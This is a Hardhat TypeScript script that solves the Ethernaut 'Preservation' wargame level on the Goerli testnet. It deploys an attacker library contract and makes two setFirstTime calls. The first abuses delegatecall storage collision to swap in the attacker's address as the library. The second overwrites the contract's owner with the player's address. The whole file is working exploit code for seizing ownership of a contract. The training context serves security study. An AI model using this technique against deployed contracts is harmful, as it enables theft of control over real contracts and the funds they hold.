import { ethers } from "hardhat";

async function attackPreservation() {
    // change contract addresses here.
    const preservationAddress = "0x6a93e425f74d3efAD0f030C1cc00226c2B5f8f6b";
    // const player = ""; //place your player address here (you may type player in ethernaut console)
    const args: any[] = [];
    const player = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below 🚀
    // Vulnerability comes from the possibility of making a malicious contract the library
    // Additional read:
    // site here

    // using my custom rpc stored in .env (for privacy)
    const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
    const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
    const players = new ethers.Wallet(player, provider);
    console.log("Player's address is: ", players.address);

    // deploying attack contract here
    // const deployed = await deployContract(hre, "AttackLibraryContract", args);
    // alternative below
    console.log("Deploying attack contract AttackLibraryContract...");
    const attack = await (
        await ethers.getContractFactory("AttackLibraryContract", player)
    ).deploy();
    // console.log(attack);
    console.log(`Attack contract deployed to ${attack.address}`);
    // experimantal verify below
    // if (attackLibraryContract.address){
    //     console.log("Verifying contract...");
    //     try {
    //         await run("verify:verify", {
    //             address: eternalKing.address,
    //             constructorArguments: args,
    //         });
    //     } catch (e: any) {
    //         if (e.message.toLowerCase().includes("already verified")) {
    //             console.log("Already verified!");
    //         } else {
    //             console.log(e);
    //         }
    //     }
    // }

    // attack starts here.
    const contract = await ethers.getContractAt("Preservation", preservationAddress);
    const oldOwner = await contract.owner();
    console.log(`Current owner is: ${oldOwner}`);
    const oldLibrary = await contract.timeZone1Library();
    console.log("Current timeZone1Library is: ", oldLibrary);
    console.log("Changing library to Players own contract and attack...");
    //old implementation
    const uint256 = "0x" + "0".repeat(24) + attack.address.slice(2);
    console.log(`setting to ${uint256}`);
    const tx1 = await contract.setFirstTime(uint256);
    const tx1receipt = await tx1.wait(1);
    // console.log(tx1receipt);
    console.log("change library done");
    console.log("Change library done!now setting new owner via vulnerability...");
    const tx2 = await contract.setFirstTime(1);
    const tx2Receipt = await tx2.wait(1);
    console.log(tx2Receipt);
    console.log("change owner done");
    // new implementation
    // const tx1 = await attack.hack(preservationAddress, players.address);
    // const tx1Receipt = await tx1.wait();
    // console.log(tx1Receipt);
    console.log("tx done");
    const newLibrary = await contract.timeZone1Library();
    console.log("New timeZone1Library is: ", newLibrary);
    const newOwner = await contract.owner();
    const passed = (await contract.owner()) === players.address;
    console.log(`New Owner is: ${newOwner}`);
    if (passed) {
        console.log("Congrats! Level Passed, You may now submit to ethernaut");
    } else {
        console.log("Player is not the owner, review code above and try again...");
    }
}

attackPreservation()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
